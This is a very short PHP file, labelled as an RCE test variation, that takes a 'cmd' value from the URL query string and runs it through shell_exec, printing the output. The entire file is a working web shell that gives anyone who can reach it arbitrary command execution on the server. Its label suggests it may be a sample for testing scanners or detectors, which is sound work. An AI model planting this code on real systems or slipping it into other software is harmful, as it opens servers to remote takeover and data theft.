<?php
// RCE test variation #233
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>